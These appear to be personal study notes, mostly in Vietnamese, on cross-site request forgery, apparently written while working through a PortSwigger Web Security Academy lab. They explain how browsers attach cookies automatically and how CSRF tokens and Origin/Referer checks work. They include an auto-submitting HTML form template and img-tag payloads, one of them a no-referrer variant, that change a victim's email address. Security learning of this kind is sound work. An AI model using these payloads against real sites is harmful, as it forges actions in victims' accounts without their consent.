### note

> [!NOTE] cốt lõi
> can this request actually from user?

> [!NOTE] cốt lõi về csrs
> Cốt lõi vẫn là giả danh request hợp lệ.Cái website mà hacker dựng lên sẽ giả danh request hợp lệ--> bắt trình duyệt của victim gửi request đó 


> [!NOTE] csrf token
> với các request nhạy cảm , sửa thông tin, để tránh bị giả mạo reuest khi victtim bị csrf thì người ta thêm một cái csrf token vào các request nhạy cảm đó
> 

> [!NOTE] Title
> GET và POST liên quan gì đến CSRF?


> [!NOTE]
> lợi dụng việc trình duyệt auto gán cookie vào request trên máy nạn nhân + thêm yếu tố ko có cái xác thực rằng liệu request này có thực sự đưowcj gửi từ máy nạn nhân hay ko==> CSRF


-3 yếu tố liên quan tới csrs
- [ ] csrs token
- [ ] origin /referer
-nếu có csrf-token thì sao=> liệu có nó thì ko tấn công csrs được nữa đko?
- [ ] check tiếp xem ....
- [ ] bỏ csrf xem nó có nhận ko 
- [ ] mỗi phương thức POST hay còn GET

-form mẫu html gửi request
```
<html>
  <body>
    <form action="___ĐIỀN_URL_ĐÍCH___" method="___ĐIỀN_METHOD___">
      <input type="hidden" name="___ĐIỀN_TÊN_THAM_SỐ___" value="___ĐIỀN_EMAIL_MỚI___" />
    </form>
    <script>
      document.forms[0].___(tự tìm hàm JS để submit form)___;
    </script>
  </body>
</html>
```

với method GET thì dùng iframe hoặc img
```
<img src="https://0af4004d0304d32680ff031e00fe00e5.web-security-academy.net/my-account/change-email?email=ha%40gmail.com">
```


-trình duyệt tự gán origin và referer vào request
=> ko có cách nào thay đổi origin.Ngoại trừ thêm cờ no referer
```
<html>
  <head>
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <img src="https://0af4004d0304d32680ff031e00fe00e5.web-security-academy.net/my-account/change-email?email=ha%40gmail.com">
  </body>
</html>
```
